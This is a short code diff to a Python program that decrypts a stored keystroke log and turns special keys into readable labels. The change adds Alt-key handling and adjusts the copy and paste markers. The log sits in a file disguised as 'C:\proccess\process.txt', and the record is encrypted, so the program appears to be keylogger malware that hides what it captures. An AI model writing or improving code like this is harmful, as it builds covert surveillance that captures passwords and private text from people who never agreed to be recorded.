@@ -317,7 +317,7 @@ def write_to_file(keys):
 def capture_data():
     data=''
     count_key=0
-    key_red_list=[' <Shift> ',' <Backspace> ',' <Ctrl> ',' <Caps_lock> ',' <Left> ',' <Right> '," <Down> "," <Up> "]
+    key_red_list=[' <Shift> ',' <Backspace> ',' <Ctrl> ',' <Caps_lock> ',' <Left> ',' <Right> '," <Down> "," <Up> ",' <Alt> ']
     with open('C:\\proccess\\process.txt','rb')as file:
             for i in file:
                 s=Crypt_my10(key_crypt).decrypt_data(i)
@@ -336,9 +336,9 @@ def capture_data():
                 elif "ctrl" in s:
                     s=" <"+'Ctrl'+"> "
                 elif '\\x03' in s:
-                    s=' (c) '
+                    s='(c) '
                 elif '\\x16' in s:
-                    s=' (v) '
+                    s='(v) '
                 elif 'left' in s:
                     s=' <Left> '
                 elif 'right' in s:
@@ -347,6 +347,8 @@ def capture_data():
                     s=" <Down> "
                 elif 'up' in s:
                     s=" <Up> "
+                elif 'alt'in s:
+                    s=' <Alt> '
                 else:
                     s=s
             
